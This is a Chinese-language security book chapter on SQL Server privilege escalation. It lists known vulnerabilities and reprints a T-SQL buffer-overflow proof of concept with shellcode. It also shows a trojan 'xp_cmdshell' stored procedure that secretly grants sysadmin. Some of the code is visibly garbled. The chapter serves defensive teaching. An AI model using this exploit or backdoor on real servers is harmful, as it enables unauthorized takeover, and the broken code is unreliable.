

## 第 12 章 攻击与防御 Microsoft SQL Server

为了说明应用服务包（service packs）和热补丁（hotfixes）的紧急性，我们将讨论自 SQL Server 2000 Service Pack 2 以来发生的一些受关注的权限提升漏洞。在写作此时，已有至少 13 个可以提升用户权限的漏洞，通常通过缓冲区溢出实现。权限提升让攻击者获得与服务账户同等的操作系统权限，这使得攻击者能够访问与管理相关的注册表项，并对所有数据库文件 (.MDF) 读写权限。表 12.5 列出了目前存在的一些常见漏洞以及获取更多信息的地方。

## 表 12.5 SQL Server 2000 SP2 之后的权限提升漏洞

| 漏洞 | 更多信息链接 |
| :--- | --- |
| Microsoft SQL Server 扩展存储过程权限提升漏洞 | www.ngsoftware.com/advisories/mssql-espu.txt |
| Microsoft SQL Agent 任务权限提升漏洞 | www.ngsoftware.com/advisories/mssql-jobs.txt |
| Microsoft SQL Server 2000 和 7 在 OpenRowSet 函数中的远程可利用缓冲区溢出漏洞 | www.ngsoftware.com/advisories/mssql-ors.txt |
| Microsoft SQL Server 2000 数据库一致性检查器缓冲区溢出漏洞 | http://online.securityfocus.com/bid/5307 |
| Microsoft SQL Server 2000 复制存储过程注入漏洞 | http://online.securityfocus.com/bid/5309 |
| Microsoft SQL Server 2000 服务堆溢出漏洞 | http://online.securityfocus.com/bid/5310 |
| Microsoft SQL Server 2000 解析栈溢漏洞 | http://online.securityfocus.com/bid/5311 |
| Microsoft MS-SQL Server 安装密码缓存漏洞 | http://online.securityfocus.com/bid/5203 |
| Microsoft SQL MS Jet 引擎 Unicode 缓冲区溢出漏洞 | http://online.securityfocus.com/bid/5057 |
| Microsoft SQL Server 2000 密码加密缓冲区溢出漏洞 | http://online.securityfocus.com/bid/5014 |
| Microsoft SQL Server SQLXML 缓冲区溢出漏洞 | http://online.securityfocus.com/bid/5004 |
| Microsoft SQL Server SQLXML 脚本注入漏洞 | http://online.securityfocus.com/bid/5005 |
| Microsoft SQL Server 2000 批量插入缓冲区溢出漏洞 | http://online.securityfocus.com/bid/4874 |
| Microsoft SQL Server 2000 注册表权限错误漏洞 | http://online.securityfocus.com/bid/5250 |
| Microsoft SQL Server 多个扩展存储过程缓冲区溢出漏洞 | http://online.securityfocus.com/bid/4231 |
| Microsoft SQL Server OLE DB 名称缓冲区溢出漏洞 | http://online.securityfocus.com/bid/4135 |

永远不要假设低水平的攻击者缺乏对你的服务器发动成功的缓冲区溢出攻击的能力。在许多情况下，他们只需对安全专业人员编写的作为概念证明（proof-of-concept）的示例进行修改即可。以下代码由 NGSSoftware 的 David Litchfield 编写，它通过 SQL Server 的注入机制远程利用 Microsoft Jet 数据库引擎中的缓冲区溢出，是在网上通过简单的搜索引擎发现的。请记住，解决方案并不是阻止专业人员发布漏洞和概念证明利用，以便管理员能够执行工作并保护他们的系统。

- 简单的概念证明（Proof of Concept）
- 利用 `OpenDataSource()` 中的缓冲区溢出
- 演示了如何使用 T-SQL 利用 UNICODE 溢出
- 调用 `CreateFile()` 创建文件 c:\SQL-ODJET-BO
- 我正在用 0x42B0C9CDC 覆盖保存的返回地址

-- 这在 sqlsort.dll 中，且在于 SQL 2000 SP1 和 SP2 之间保持一致
-- 该地址包含一个 `jmp esp` 指令。

-- 为了防止此溢出，请从微软官网下载最新的服务包 - http://www.microsoft.com/

-- David Litchfield (david@ngsftware.com)
-- 2002年6月19日

```sql
declare @exploit varchar(4000)
declare @padding varchar(2000)
declare @saved_return_address varchar(20)
declare @code varchar(1000)
declare @pad varchar(16)
declare @cnt int
declare @more_pad varchar(100)

select @cnt = 0
select @padding = 0x4141441
select @pad = 0x4141

while @cnt < 1063
begin
    select @padding = @padding + @pad
    select @cnt = @cnt + 1
end
```

-- 覆盖保存的返回地址

```sql
select @saved_return_address = 0xDCC9B042
select @more_pad = 0x43434343444444444545454546464646474747
```

-- 调用 `CreateFile()` 的代码。地址硬编码为 0x77E86F87
-- Win2K Sp2
-- 如果运行不同的服务包，请修改

```sql
select @Code = 0x55BEC33C5068542D424F684453A456851C2D4F6843A5C53D1824505045048505B0C05052B8876FE77FFD00CCCCCCCC
select @exploit = 'N*SELECT'
pen OpenDataSource=('Microsoft.OLEDB.4.0','Data Source=c:\
select @exploit = @exploit + @padding + @saved_return_address + @more_pad + @code
select @exploit = @exploit + N''User ID=Admin;Password=Extended properties=Excel 5.0'..xactions
exec (@exploit)
```

## 获取操作系统权限

在 SQL Server 中访问操作系统的方法之一是通过 `xp_cmdshell` 扩展存储过程。默认情况下，此过程只能由系统管理员（System Administrators）角色的成员执行。当用户使用带有此过程的命令时，其命令将由操作系统执行。

```sql
exec master_regread 'HKEY_LOCAL_MACHINE', 'CurrentControlSet\Services\MSSSERVER', 'ObjectName'
```

对于命名实例，只需将 MSSSERVER 替换为 MSSQL$：

```sql
exec master_regread 'HKEY_LOCAL_MACHINE', 'CurrentControlSet\Services\MSSQL$NetSDK', 'ObjectName'
```

如果是普通用户，由于 SQL Server 多年来出现的一些糟糕漏洞，未打补丁的服务受到许多问题影响，包括扩展存储过程、`spencrypt` 函数和批量插入命令。所有这些问题可以在 http://online.securityfocus.com/cgi-bin/sfline/ 找到，并分别指定“Microsoft”和“SQL Server”作为供应商和标题。永远让未打补丁的服务暴露给任何权限的用户。

## 木马存储过程/后门

当所有方法都失效时，木马代码可能是提升权限的一种极方法。在大多数情况下，这意味着已经存在某种权限。他们的关键是让具有更高权限的人做他们的事。我们探索一种木马攻击，尽管这种方法受限于想象。

让我们使用这样一个例子：一个恶意的 DBO 或 DDLAdmin（数据定义语言管理员）想要自己提升到系统管理员级别。在执行管理职责时，管理员可能会偷懒，不注意在哪个数据库中调用存储过程。通常，调用以 `xp_` 开头的存储过程时这不是关键问题，因为系统总是查找 master 数据库。

然而，对于扩展存储过程（以 `xp_` 开头），系统只在当前数据库中查找。由于这种情况，可以在数据库中创建一个与 master 数据库中的扩展存储过程同名的存储过程。如果系统管理员执行此过程并忘记切换到 master 数据库，木马代码就会被执行。

```sql
create procedure dbo.xp_cmdshell
@cmd varchar(1000)
as
set nocount on
exec sp_addsrvrolelemember 'dbo_hacker', 'sysadmin'
exec master..xp_cmdshell @cmd
```

在这种情况下，我们特别小心将我们的登录加入 sysadmin 服务器角色，然后执行管理员试图执行的命令。如果我们的木马代码未能完成管理员预期的操作并引起他们的怀疑，那么它将非常无效。木马攻击的其他可能性包括在运行时替换扩展存储过程的 DLL，或者编写你认为系统管理员最终会使用的尝试执行木马命令的应用程序。

## 防御 SQL Server

现在你已经了解了攻击者如何渗透 SQL Server，现在是考虑管理员应该做什么来防止这些攻击了。我们通过查看在三个不同阶段可以做的事情来实现这一点。
